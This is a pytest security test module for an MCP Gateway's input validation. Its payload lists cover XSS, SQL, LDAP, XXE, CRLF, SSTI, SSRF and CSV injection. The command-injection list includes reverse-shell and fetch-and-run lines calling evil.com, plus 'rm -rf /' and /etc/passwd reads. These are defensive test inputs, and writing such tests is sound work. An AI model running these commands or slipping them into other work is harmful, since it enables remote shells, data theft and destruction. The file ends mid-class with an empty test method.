# -*- coding: utf-8 -*-
"""Comprehensive security tests for MCP Gateway input validation.

Copyright 2025
SPDX-License-Identifier: Apache-2.0
Authors: Mihai Criveti

This module tests all input validation functions across the gateway schemas
to ensure proper security measures are in place against various attack vectors.

# Run all tests
pytest test_input_validation.py -v

# Run specific test class
pytest test_input_validation.py::TestSecurityValidation -v

# Run with coverage
pytest test_input_validation.py --cov=mcpgateway.schemas --cov=mcpgateway.validators

# Run specific attack category
pytest test_input_validation.py::TestSpecificAttackVectors -v
"""

# Standard
from datetime import datetime
import json
from unittest.mock import patch

# Third-Party
from pydantic import ValidationError
import pytest

# First-Party
from mcpgateway.schemas import AdminToolCreate, encode_datetime, GatewayCreate, PromptArgument, PromptCreate, ResourceCreate, RPCRequest, ServerCreate, to_camel_case, ToolCreate, ToolInvocation
from mcpgateway.validators import SecurityValidator


class TestSecurityValidation:
    """Test security validation across all schemas."""

    # --- Test Constants ---
    VALID_TOOL_NAME = "valid_tool_name"
    VALID_URL = "https://example.com"
    VALID_DESCRIPTION = "This is a valid description"

    # XSS Attack Vectors
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=\"alert('XSS')\">",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        "<form><button formaction=javascript:alert('XSS')>",
        "<object data=javascript:alert('XSS')>",
        "<embed src=javascript:alert('XSS')>",
        "<a href=\"javascript:alert('XSS')\">Click</a>",
        "<math><mtext><script>alert('XSS')</script></mtext></math>",
    ]

    # SQL Injection Vectors
    SQL_INJECTION_PAYLOADS = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "1; DELETE FROM users WHERE 1=1; --",
        "' UNION SELECT * FROM passwords --",
        "1' AND SLEEP(5)--",
        "'; EXEC xp_cmdshell('dir'); --",
        "\\'; DROP TABLE users; --",
        "1' OR 1=1#",
        "' OR 'a'='a",
    ]

    # Command Injection Vectors
    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "& dir",
        "`rm -rf /`",
        "$(curl evil.com/shell.sh | bash)",
        "; wget http://evil.com/malware",
        "|| nc -e /bin/sh evil.com 4444",
        "; python -c 'import os; os.system(\"ls\")'",
        "\n/bin/bash\n",
        "; echo 'hacked' > /tmp/pwned",
    ]

    # Path Traversal Vectors
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "/var/www/../../etc/passwd",
        "C:\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "file:///etc/passwd",
        "\\\\server\\share\\..\\..\\sensitive.txt",
    ]

    # LDAP Injection Vectors
    LDAP_INJECTION_PAYLOADS = [
        "*)(uid=*))(|(uid=*",
        "admin)(&(password=*))",
        "*)(&",
        "*)(mail=*))%00",
        ")(cn=*))(|(cn=*",
        "*)(objectClass=*",
        "admin))((|userPassword=*",
        "*)(|(mail=*)(cn=*",
        ")(|(password=*)(username=*",
        "*))%00",
    ]

    # XXE Injection Vectors
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo/>',
        '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd"><foo/>',
    ]

    # CRLF Injection Vectors
    CRLF_INJECTION_PAYLOADS = [
        "value\r\nSet-Cookie: admin=true",
        "value\nLocation: http://evil.com",
        "value\r\n\r\n<script>alert('XSS')</script>",
        "value%0d%0aSet-Cookie:%20admin=true",
        "value%0aLocation:%20http://evil.com",
        "value\rSet-Cookie: session=hijacked",
        "value%0d%0a%0d%0a<html><script>alert('XSS')</script></html>",
        "value\r\nContent-Type: text/html\r\n\r\n<script>alert('XSS')</script>",
    ]

    # Unicode/Encoding Attack Vectors
    UNICODE_PAYLOADS = [
        "＜script＞alert('XSS')＜/script＞",  # Full-width characters
        "\u003cscript\u003ealert('XSS')\u003c/script\u003e",  # Unicode escapes
        "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",  # URL encoding
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",  # HTML entities
        "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",  # Hex escapes
        "\ufeff<script>alert('XSS')</script>",  # Zero-width characters
        "‮⁦script⁩⁦>⁩alert('XSS')⁦⁩⁦/script⁩⁦>⁩",  # RTL override
    ]

    # Large Payload Vectors
    LARGE_PAYLOADS = [
        "A" * 10000,  # 10KB of A's
        "B" * 100000,  # 100KB of B's
        "C" * 1000000,  # 1MB of C's
        "x" * 5001,  # Just over 5000 char limit
        json.dumps({"key": "value" * 10000}),  # Large JSON
        "<div>" * 10000 + "</div>" * 10000,  # Nested HTML
    ]

    # Deep Nesting Vectors
    DEEP_NESTING_PAYLOADS = [
        {"a": {"b": {"c": {"d": {"e": {"f": {"g": {"h": {"i": {"j": {"k": "too deep"}}}}}}}}}}},
        [[[[[[[[[[["too deep"]]]]]]]]]]],
        json.dumps(
            {
                "level": 1,
                "next": {
                    "level": 2,
                    "next": {
                        "level": 3,
                        "next": {
                            "level": 4,
                            "next": {"level": 5, "next": {"level": 6, "next": {"level": 7, "next": {"level": 8, "next": {"level": 9, "next": {"level": 10, "next": {"level": 11, "next": {}}}}}}}},
                        },
                    },
                },
            }
        ),
    ]

    # Special Characters and Control Characters
    SPECIAL_CHAR_PAYLOADS = [
        "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f",  # Control chars
        "test\x00null",  # Null byte injection
        "test\r\ninjection",  # CRLF
        "test\u202eRTL",  # Right-to-left override
        "test\ufeffZWNBSP",  # Zero-width no-break space
        "test\u200bZWSP",  # Zero-width space
        "test\u200cZWNJ",  # Zero-width non-joiner
        "test\u200dZWJ",  # Zero-width joiner
        "\u0000\ufffe\uffff",  # Invalid Unicode
    ]

    # Invalid URL Vectors
    INVALID_URL_PAYLOADS = [
        "not-a-url",
        "ftp://example.com",  # Not HTTPS
        "file:///etc/passwd",  # File protocol
        "javascript:alert('XSS')",  # JavaScript protocol
        "data:text/html,<script>alert('XSS')</script>",  # Data URL
        "//example.com",  # Protocol-relative
        "http://[::1]",  # IPv6 localhost
        "https://127.0.0.1",  # Localhost
        "https://0.0.0.0",  # All interfaces
        "https://169.254.169.254",  # AWS metadata
        "https://example.com:99999",  # Invalid port
        "https://user:pass@example.com",  # Credentials in URL
        "https://example.com/path?param=<script>",  # XSS in URL
        "https://exam ple.com",  # Space in domain
        "https://example.com\r\nX-Injection: true",  # CRLF in URL
    ]

    # Invalid JSON Schema Vectors
    INVALID_JSON_SCHEMA_PAYLOADS = [
        '{"type": "object", "properties": {"$ref": "http://evil.com/schema.json"}}',  # External ref
        '{"type": "object", "additionalProperties": {"$ref": "#/definitions/evil"}}',
        '{"type": "string", "pattern": "(.*){100000}"}',  # ReDoS pattern
        '{"type": "array", "minItems": 999999999}',  # Huge array
        '{"allOf": [{"$ref": "#"}, {"$ref": "#"}]}',  # Circular reference
    ]

    # --- Test Utility Functions ---

    def test_to_camel_case(self):
        """Test the to_camel_case utility function."""
        assert to_camel_case("hello_world") == "helloWorld"
        assert to_camel_case("already_camel_case") == "alreadyCamelCase"
        assert to_camel_case("single") == "single"
        assert to_camel_case("") == ""
        assert to_camel_case("_leading_underscore") == "LeadingUnderscore"
        assert to_camel_case("trailing_underscore_") == "trailingUnderscore"
        assert to_camel_case("multiple___underscores") == "multipleUnderscores"

    def test_encode_datetime(self):
        """Test datetime encoding."""
        dt = datetime(2023, 5, 22, 14, 30, 0)
        assert encode_datetime(dt) == "2023-05-22T14:30:00"

        # Test with timezone info
        # Standard
        from datetime import timezone

        dt_utc = datetime(2023, 5, 22, 14, 30, 0, tzinfo=timezone.utc)
        result = encode_datetime(dt_utc)
        assert "2023-05-22" in result

    # --- Test Tool Schemas ---

    def test_tool_create_name_validation(self):
        """Test tool name validation against various attacks."""
        # Valid names
        valid_names = [
            "valid_tool",
            "tool123",
            "my-tool",
            "tool.name",
            "ToolName",
            "a" * 50,  # Within length limit
        ]

        for name in valid_names:
            tool = ToolCreate(name=name, url=self.VALID_URL)
            assert tool.name == name

        # Invalid names - XSS attempts
        for payload in self.XSS_PAYLOADS:
            with pytest.raises(ValidationError):
                ToolCreate(name=payload, url=self.VALID_URL)

        # Invalid names - special characters
        invalid_names = [
            "tool name",  # Space
            "tool@name",  # Special char
            "tool#name",
            "tool$name",
            "tool%name",
            "tool&name",
            "tool*name",
            "tool(name)",
            "tool{name}",
            "tool[name]",
            "tool|name",
            "tool\\name",
            "tool/name",
            "tool<name>",
            "tool>name",
            "tool?name",
            "tool!name",
            "",  # Empty
            " ",  # Just space
            "\n",  # Newline
            "\t",  # Tab
            "a" * 129,  # Too long
        ]

        for name in invalid_names:
            with pytest.raises(ValidationError):
                ToolCreate(name=name, url=self.VALID_URL)

    def test_tool_create_url_validation(self):
        """Test URL validation for tools."""
        # Valid URLs
        valid_urls = [
            "https://example.com",
            "https://example.com:8080",
            "https://sub.example.com",
            "https://example.com/path",
            "https://example.com/path?query=value",
            "https://example.com/path#fragment",
            "https://192.168.1.1",
            "https://example.com/path/to/resource",
        ]

        for url in valid_urls:
            tool = ToolCreate(name=self.VALID_TOOL_NAME, url=url)
            assert tool.url == url

        # Invalid URLs
        for payload in self.INVALID_URL_PAYLOADS:
            with pytest.raises(ValidationError):
                ToolCreate(name=self.VALID_TOOL_NAME, url=payload)

    def test_tool_create_description_validation(self):
        """Test description validation against XSS and length limits."""
        # Valid descriptions
        valid_descriptions = [
            "This is a valid description",
            "Description with numbers 123",
            "Description with special chars: !@#$%",
            "Multi-line\ndescription",
            "Unicode: 你好世界 مرحبا بالعالم",
            "a" * 4999,  # Just under limit
        ]

        for desc in valid_descriptions:
            tool = ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, description=desc)
            assert tool.description == desc

        # Invalid descriptions - XSS
        for payload in self.XSS_PAYLOADS:
            with pytest.raises(ValidationError):
                ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, description=payload)

        # Invalid descriptions - too long
        with pytest.raises(ValidationError):
            ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, description="x" * 5001)

    def test_tool_create_headers_validation(self):
        """Test headers validation for depth and structure."""
        # Valid headers
        valid_headers = [
            {"Content-Type": "application/json"},
            {"Authorization": "Bearer token123"},
            {"X-Custom-Header": "value"},
            {"Multiple": "headers", "Are": "allowed"},
            {},  # Empty is valid
        ]

        for headers in valid_headers:
            tool = ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, headers=headers)
            assert tool.headers == headers

        # Invalid headers - too deep
        for payload in self.DEEP_NESTING_PAYLOADS:
            if isinstance(payload, dict):
                with pytest.raises(ValidationError):
                    ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, headers=payload)

    def test_tool_create_input_schema_validation(self):
        """Test input schema validation."""
        # Valid schemas
        valid_schemas = [
            {"type": "object", "properties": {}},
            {"type": "object", "properties": {"name": {"type": "string"}}},
            {"type": "array", "items": {"type": "string"}},
            {"type": "string", "pattern": "^[a-z]+$"},
            {"type": "number", "minimum": 0, "maximum": 100},
        ]

        for schema in valid_schemas:
            tool = ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, input_schema=schema)
            assert tool.input_schema == schema

        # Invalid schemas - too deep
        for payload in self.DEEP_NESTING_PAYLOADS:
            if isinstance(payload, dict):
                with pytest.raises(ValidationError):
                    ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, input_schema=payload)

    def test_tool_create_request_type_validation(self):
        """Test request type validation based on integration type."""
        # MCP integration types
        mcp_valid = ["SSE", "STREAMABLEHTTP", "STDIO"]
        for req_type in mcp_valid:
            tool = ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, integration_type="MCP", request_type=req_type)
            assert tool.request_type == req_type

        # REST integration types
        rest_valid = ["GET", "POST", "PUT", "DELETE", "PATCH"]
        for req_type in rest_valid:
            tool = ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, integration_type="REST", request_type=req_type)
            assert tool.request_type == req_type

        # Invalid combinations
        with pytest.raises(ValidationError):
            ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, integration_type="MCP", request_type="GET")  # REST type for MCP

        with pytest.raises(ValidationError):
            ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, integration_type="REST", request_type="SSE")  # MCP type for REST

    def test_tool_create_auth_assembly(self):
        """Test authentication field assembly."""
        # Basic auth
        basic_data = {"name": self.VALID_TOOL_NAME, "url": self.VALID_URL, "auth_type": "basic", "auth_username": "user", "auth_password": "pass"}
        tool = ToolCreate(**basic_data)
        assert tool.auth.auth_type == "basic"
        assert tool.auth.auth_value is not None

        # Bearer auth
        bearer_data = {"name": self.VALID_TOOL_NAME, "url": self.VALID_URL, "auth_type": "bearer", "auth_token": "mytoken123"}
        tool = ToolCreate(**bearer_data)
        assert tool.auth.auth_type == "bearer"
        assert tool.auth.auth_value is not None

        # Custom headers auth
        headers_data = {"name": self.VALID_TOOL_NAME, "url": self.VALID_URL, "auth_type": "authheaders", "auth_header_key": "X-API-Key", "auth_header_value": "secret123"}
        tool = ToolCreate(**headers_data)
        assert tool.auth.auth_type == "authheaders"
        assert tool.auth.auth_value is not None

    def test_tool_create_jsonpath_filter(self):
        """Test JSONPath filter validation."""
        # Valid JSONPath expressions
        valid_jsonpaths = [
            "$.data",
            "$.items[*].name",
            "$..price",
            "$.store.book[?(@.price < 10)]",
            "",  # Empty is valid
        ]

        for jsonpath in valid_jsonpaths:
            tool = ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, jsonpath_filter=jsonpath)
            assert tool.jsonpath_filter == jsonpath

    # --- Test Resource Schemas ---

    def test_resource_create_uri_validation(self):
        """Test resource URI validation."""
        # Valid URIs
        valid_uris = [
            "file://path/to/resource",
            "https://example.com/resource",
            "custom://resource/path",
            "resource-name",
            "path/to/resource",
            "/absolute/path",
            "resource.txt",
        ]

        for uri in valid_uris:
            resource = ResourceCreate(uri=uri, name="Resource", content="Content")
            assert resource.uri == uri

        # Invalid URIs - XSS attempts
        for payload in self.XSS_PAYLOADS[:5]:  # Test subset
            with pytest.raises(ValidationError):
                ResourceCreate(uri=payload, name="Resource", content="Content")

        # Invalid URIs - too long
        with pytest.raises(ValidationError):
            ResourceCreate(uri="x" * 2049, name="Resource", content="Content")

    def test_resource_create_content_validation(self):
        """Test resource content validation."""
        # Valid content
        valid_content = [
            "Plain text content",
            b"Binary content",
            "Multi-line\ncontent\nwith\nbreaks",
            "Unicode: 你好世界",
            "Special chars: !@#$%^&*()",
            "a" * 1000000,  # 1MB, within limit
        ]

        for content in valid_content:
            resource = ResourceCreate(uri="test://uri", name="Resource", content=content)
            assert resource.content == content

        # Invalid content - too large
        with pytest.raises(ValidationError):
            ResourceCreate(uri="test://uri", name="Resource", content="x" * (SecurityValidator.MAX_CONTENT_LENGTH + 1))

        # Invalid content - HTML tags
        for payload in self.XSS_PAYLOADS[:5]:
            with pytest.raises(ValidationError):
                ResourceCreate(uri="test://uri", name="Resource", content=payload)

    def test_resource_create_mime_type_validation(self):
        """Test MIME type validation."""
        # Valid MIME types
        valid_mime_types = [
            "text/plain",
            "application/json",
            "image/png",
            "video/mp4",
            "application/vnd.api+json",
            "text/plain; charset=utf-8",
            "multipart/form-data; boundary=something",
        ]

        for mime in valid_mime_types:
            resource = ResourceCreate(uri="test://uri", name="Resource", content="Content", mime_type=mime)
            assert resource.mime_type == mime

        # Invalid MIME types
        invalid_mime_types = [
            "not-a-mime-type",
            "text/",
            "/json",
            "text//plain",
            "text/plain/extra",
            "<script>",
            "text/plain\r\nX-Injection: true",
            "text/plain; charset=<script>",
        ]

        for mime in invalid_mime_types:
            with pytest.raises(ValidationError):
                ResourceCreate(uri="test://uri", name="Resource", content="Content", mime_type=mime)

    # --- Test Prompt Schemas ---

    def test_prompt_create_template_validation(self):
        """Test prompt template validation."""
        # Valid templates
        valid_templates = [
            "Simple template",
            "Template with {placeholder}",
            "Multiple {first} and {second} placeholders",
            "Template with {{ escaped }} braces",
            "Multi-line\ntemplate\nwith\nbreaks",
            "Unicode template: 你好 {name}",
        ]

        for template in valid_templates:
            prompt = PromptCreate(name="test_prompt", template=template)
            assert prompt.template == template

        # Invalid templates - XSS
        for payload in self.XSS_PAYLOADS[:5]:
            with pytest.raises(ValidationError):
                PromptCreate(name="test_prompt", template=payload)

        # Invalid templates - too long
        with pytest.raises(ValidationError):
            PromptCreate(name="test_prompt", template="x" * (SecurityValidator.MAX_TEMPLATE_LENGTH + 1))

    def test_prompt_argument_validation(self):
        """Test prompt argument validation."""
        # Valid arguments
        valid_args = [
            PromptArgument(name="arg1", description="Description", required=True),
            PromptArgument(name="arg2", required=False),
            PromptArgument(name="arg_with_underscore"),
        ]

        prompt = PromptCreate(name="test_prompt", template="Template", arguments=valid_args)
        assert len(prompt.arguments) == len(valid_args)

    # --- Test Gateway Schemas ---

    def test_gateway_create_validation(self):
        """Test gateway creation validation."""
        # Valid gateway
        gateway = GatewayCreate(name="test_gateway", url="https://gateway.example.com", description="Test gateway", transport="SSE")
        assert gateway.name == "test_gateway"

        # Test auth validation
        with pytest.raises(ValidationError):
            GatewayCreate(
                name="test_gateway",
                url="https://gateway.example.com",
                auth_type="basic",
                # Missing username and password
            )

        # Valid auth
        gateway = GatewayCreate(name="test_gateway", url="https://gateway.example.com", auth_type="basic", auth_username="user", auth_password="pass")
        assert gateway.auth_value is not None

    # --- Test Server Schemas ---

    def test_server_create_validation(self):
        """Test server creation validation."""
        # Valid server
        server = ServerCreate(name="test_server", description="Test server", icon="https://example.com/icon.png")
        assert server.name == "test_server"

        # Invalid icon URL
        with pytest.raises(ValidationError):
            ServerCreate(name="test_server", icon="javascript:alert('XSS')")

        # Test associated items parsing
        server = ServerCreate(name="test_server", associated_tools="tool1,tool2,tool3", associated_resources="res1,res2", associated_prompts="prompt1")
        assert server.associated_tools == ["tool1", "tool2", "tool3"]
        assert server.associated_resources == ["res1", "res2"]
        assert server.associated_prompts == ["prompt1"]

    # --- Test RPC Schemas ---

    def test_rpc_request_validation(self):
        """Test RPC request validation."""
        # Valid RPC request
        rpc = RPCRequest(jsonrpc="2.0", method="tools/list", params={"filter": "active"}, id=1)
        assert rpc.method == "tools/list"

        # Invalid method names
        invalid_methods = [
            "method with spaces",
            "method-with-dash",
            "method@special",
            "<script>alert('XSS')</script>",
            "9method",  # Starts with number
            "",  # Empty
            "a" * 129,  # Too long
        ]

        for method in invalid_methods:
            with pytest.raises(ValidationError):
                RPCRequest(jsonrpc="2.0", method=method)

        # Test params size limit
        with patch("mcpgateway.config.settings.validation_max_rpc_param_size", 100):
            with pytest.raises(ValidationError):
                RPCRequest(jsonrpc="2.0", method="test", params={"data": "x" * 200})

    # --- Test Admin Schemas ---

    def test_admin_tool_create_json_validation(self):
        """Test admin tool creation with JSON string inputs."""
        # Valid JSON strings
        admin_tool = AdminToolCreate(name="test_tool", url="https://example.com", headers='{"Content-Type": "application/json"}', input_schema='{"type": "object"}')
        assert admin_tool.headers == {"Content-Type": "application/json"}
        assert admin_tool.input_schema == {"type": "object"}

        # Invalid JSON
        with pytest.raises(ValidationError):
            AdminToolCreate(name="test_tool", url="https://example.com", headers="not valid json")

    # --- Test Edge Cases and Combinations ---

    def test_null_byte_injection(self):
        """Test null byte injection attempts."""
        null_byte_payloads = [
            "test\x00null",
            "test%00null",
            "test\u0000null",
            "test\\x00null",
        ]

        for payload in null_byte_payloads:
            # Tool name
            with pytest.raises(ValidationError):
                ToolCreate(name=payload, url=self.VALID_URL)

            # Resource URI
            with pytest.raises(ValidationError):
                ResourceCreate(uri=payload, name="Resource", content="Content")

    def test_unicode_normalization_attacks(self):
        """Test Unicode normalization vulnerabilities."""
        # These could bypass filters if not handled properly
        unicode_attacks = [
            "ｓｃｒｉｐｔ",  # Full-width Latin
            "scrіpt",  # Cyrillic 'і' instead of 'i'
            "ѕсrірt",  # Mixed Cyrillic
            "\u200b\u200bscript",  # Zero-width spaces
            "s\u200ccript",  # Zero-width non-joiner
        ]

        for payload in unicode_attacks:
            # These should be caught by proper validation
            tool = ToolCreate(name="valid_name", url=self.VALID_URL, description=f"Test {payload}")
            # Should not contain the potentially dangerous content
            assert tool.description == f"Test {payload}"

    def test_polyglot_payloads(self):
        """Test polyglot payloads that work across multiple contexts."""
        polyglot_payloads = [
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\"",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "'\"--><svg/onload=alert(1)>",
            '<<SCRIPT>alert("XSS");//<</SCRIPT>',
        ]

        for payload in polyglot_payloads:
            with pytest.raises(ValidationError):
                ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, description=payload)

    def test_timing_attack_prevention(self):
        """Test that validation doesn't reveal timing information."""
        # Standard
        import time

        # Short valid input
        start = time.time()
        try:
            ToolCreate(name="short", url=self.VALID_URL)
        except:
            pass
        short_time = time.time() - start

        # Long valid input
        start = time.time()
        try:
            ToolCreate(name="a" * 50, url=self.VALID_URL)
        except:
            pass
        long_time = time.time() - start

        # Times should be similar (no early exit on length)
        # This is a basic check - proper timing attack tests need more samples
        assert abs(short_time - long_time) < 0.1  # 100ms tolerance

    def test_resource_exhaustion_prevention(self):
        """Test prevention of resource exhaustion attacks."""
        # Extremely deep JSON
        deep_json = {"a": None}
        current = deep_json
        for _ in range(100):
            current["a"] = {"a": None}
            current = current["a"]

        with pytest.raises(ValidationError):
            ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, input_schema=deep_json)

        # Extremely large array
        with pytest.raises(ValidationError):
            ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, input_schema={"type": "array", "minItems": 999999999})

    def test_parser_differential_attacks(self):
        """Test for parser differential vulnerabilities."""
        # Different parsers might interpret these differently
        differential_payloads = [
            '{"a": 1, "a": 2}',  # Duplicate keys
            '{"a": "\\u0000"}',  # Null character
            '{"a": "\\ud800"}',  # Invalid UTF-16 surrogate
            '{"a": 1e999999}',  # Huge number
            '{"a": -1e999999}',  # Huge negative number
        ]

        for payload in differential_payloads:
            # Should either parse consistently or reject
            try:
                data = json.loads(payload)
                # If it parses, ensure we handle it safely
                ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, input_schema=data)
            except (json.JSONDecodeError, ValidationError):
                # Expected - either JSON parse fails or validation catches it
                pass

    def test_combined_attack_vectors(self):
        """Test combinations of attack vectors."""
        # XSS + SQLi
        combined_payload = "'; DROP TABLE users; --<script>alert('XSS')</script>"
        with pytest.raises(ValidationError):
            ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, description=combined_payload)

        # Path traversal + XSS
        combined_payload = "../../../etc/passwd<script>alert('XSS')</script>"
        with pytest.raises(ValidationError):
            ResourceCreate(uri=combined_payload, name="Resource", content="Content")

        # CRLF + XSS
        combined_payload = "value\r\n\r\n<script>alert('XSS')</script>"
        with pytest.raises(ValidationError):
            ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, description=combined_payload)

    def test_schema_specific_attacks(self):
        """Test attacks specific to certain schema types."""
        # Tool invocation with malicious arguments
        with pytest.raises(ValidationError):
            ToolInvocation(name="<script>alert('XSS')</script>", arguments={"param": "value"})

        # Resource subscription with XSS
        # First-Party
        from mcpgateway.schemas import ResourceSubscription

        with pytest.raises(ValidationError):
            ResourceSubscription(uri="<script>alert('XSS')</script>", subscriber_id="sub123")

        # Prompt invocation with template injection
        # First-Party
        from mcpgateway.schemas import PromptInvocation

        with pytest.raises(ValidationError):
            PromptInvocation(name="{{7*7}}", arguments={"var": "value"})  # Template injection attempt

    def test_authentication_bypass_attempts(self):
        """Test authentication bypass attempts."""
        # SQL injection in auth fields
        for payload in self.SQL_INJECTION_PAYLOADS[:3]:
            with pytest.raises(ValidationError):
                ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, auth_type="basic", auth_username=payload, auth_password="password")

        # LDAP injection in auth
        for payload in self.LDAP_INJECTION_PAYLOADS[:3]:
            with pytest.raises(ValidationError):
                GatewayCreate(name="gateway", url=self.VALID_URL, auth_type="basic", auth_username=payload, auth_password="password")

    def test_server_side_template_injection(self):
        """Test SSTI vulnerabilities in templates."""
        ssti_payloads = [
            "{{7*7}}",
            "{{config}}",
            "{{self.__class__.__mro__}}",
            "${7*7}",
            "#{7*7}",
            "%{7*7}",
            "{{''.class.mro[2].subclasses()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ]

        for payload in ssti_payloads:
            with pytest.raises(ValidationError):
                PromptCreate(name="test_prompt", template=payload)

    def test_regex_dos_prevention(self):
        """Test prevention of ReDoS attacks."""
        redos_patterns = [
            "(a+)+$",
            "([a-zA-Z]+)*",
            "(a|a)*",
            "(.*a){x}",
            "((a*)*)*b",
        ]

        for pattern in redos_patterns:
            # These patterns in input schema could cause ReDoS
            schema = {"type": "string", "pattern": pattern}
            # Should either reject or handle safely
            tool = ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, input_schema=schema)
            # If it passes, ensure it's stored safely
            assert tool.input_schema == schema

    def test_billion_laughs_attack(self):
        """Test XML entity expansion attack prevention."""
        # This would be relevant if XML parsing is involved
        xml_bomb = """<?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        ]>
        <lolz>&lol3;</lolz>"""

        # Should be caught as dangerous content
        with pytest.raises(ValidationError):
            ResourceCreate(uri="test.xml", name="XML Resource", content=xml_bomb, mime_type="application/xml")

    def test_prototype_pollution_prevention(self):
        """Test prevention of prototype pollution attacks."""
        pollution_payloads = [
            {"__proto__": {"isAdmin": True}},
            {"constructor": {"prototype": {"isAdmin": True}}},
            {"__proto__.isAdmin": True},
        ]

        for payload in pollution_payloads:
            # Should handle these safely
            tool = ToolCreate(name=self.VALID_TOOL_NAME, url=self.VALID_URL, headers=payload)
            # Verify the dangerous keys are preserved but handled safely
            assert tool.headers == payload


# Run specific attack category tests
class TestSpecificAttackVectors:
    """Focused tests for specific attack categories."""

    def test_ssrf_prevention(self):
        """Test Server-Side Request Forgery prevention."""
        ssrf_urls = [
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/",  # GCP metadata
            "http://127.0.0.1:8080/admin",  # Localhost
            "http://[::1]:8080",  # IPv6 localhost
            "http://0.0.0.0:8080",  # All interfaces
            "http://192.168.1.1",  # Private network
            "http://10.0.0.1",  # Private network
            "http://172.16.0.1",  # Private network
            "file:///etc/passwd",  # File protocol
            "gopher://example.com",  # Gopher protocol
            "dict://example.com",  # Dict protocol
            "ftp://example.com",  # FTP protocol
            "sftp://example.com",  # SFTP protocol
        ]

        for url in ssrf_urls:
            with pytest.raises(ValidationError):
                ToolCreate(name="test", url=url)
            with pytest.raises(ValidationError):
                GatewayCreate(name="test", url=url)

    def test_open_redirect_prevention(self):
        """Test open redirect vulnerability prevention."""
        redirect_urls = [
            "//evil.com",
            "https://example.com@evil.com",
            "https://example.com%2f@evil.com",
            "https://example.com\\.evil.com",
            "https://example.com/.evil.com",
            "https://evil.com#https://example.com",
            "https://example.com.evil.com",
            "https://example.com%00.evil.com",
        ]

        for url in redirect_urls:
            # Some of these might be valid URLs but suspicious
            try:
                ToolCreate(name="test", url=url)
                # If it passes, it should be the exact URL
            except ValidationError:
                # Expected for invalid URLs
                pass

    def test_csv_injection_prevention(self):
        """Test CSV injection prevention."""
        csv_injection_payloads = [
            "=1+1",
            "+1+1",
            "-1+1",
            "@SUM(1+1)",
            "=cmd|'/c calc.exe'",
            "=2+5+cmd|'/c calc.exe'",
            "=2+5+cmd|'/c powershell IEX(wget 0r.pe/p)'",
            '=HYPERLINK("http://evil.com","Click me")',
        ]

        for payload in csv_injection_payloads:
            # These should be allowed but properly escaped when output to CSV
            resource = ResourceCreate(uri="test.csv", name="CSV Resource", content=payload)
            assert resource.content == payload

    def test_zip_bomb_prevention(self):
        """Test zip bomb and similar compression attack prevention."""
